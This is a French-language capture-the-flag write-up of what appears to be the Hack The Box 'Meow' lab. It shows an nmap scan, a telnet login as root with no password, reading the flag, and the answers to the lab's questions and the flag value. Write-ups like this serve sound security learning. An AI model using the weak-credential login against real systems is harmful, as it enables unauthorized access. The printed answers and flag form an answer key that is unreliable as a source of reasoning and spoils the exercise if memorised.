
# MEOW 

![alt text](image.png)

#telnet, #protocols, #reconnaissance, #weak credentials, #misconfiguration

## 1. Méthodologie

Ici on commence par énumérer les ports et services ouverts avec la commande:

```nmap -Sv ip_cible```

```
└──╼ [★]$ nmap -sV 10.129.16.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 15:20 CST
Nmap scan report for 10.129.16.212
Host is up (0.0099s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nous permettant de découvrir que le port 23 est ouvert (Telnet). On se connecte sur le port 23 avec `telnet IP_cible`

```
└──╼ [★]$ telnet 10.129.16.212
Trying 10.129.16.212...
Connected to 10.129.16.212.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

On peut essayer de s'authentifier avec les identifiants les plus courants comme "root", "admin" ou autre sans mot de passe:

```
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 Feb 2025 09:24:38 PM UTC

  System load:           0.08
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.16.212
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2fda

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

Une fois authentifié, on va lister les fichiers/dossiers présents avec la commande `ls`. Nous pouvons afficher le contenu du fichier avec la commande `cat file_name`.

```
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 
```

## 2. Questions

### Task 1

What does the acronym VM stand for?

```
virtual machine
```

### Task 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

```
terminal
```

### Task 3

What service do we use to form our VPN connection into HTB labs?

```
openvpn
```

### Task 4

What tool do we use to test our connection to the target with an ICMP echo request?

```
ping
```

### Task 5

What is the name of the most common tool for finding open ports on a target?

```
nmap
```

### Task 6

What service do we identify on port 23/tcp during our scans?

```
telnet
```

### Task 7

What username is able to log into the target over telnet with a blank password?

```
root
```

### Flag

```
b40abdfe23665f766f9c61ecba8a4c19
```
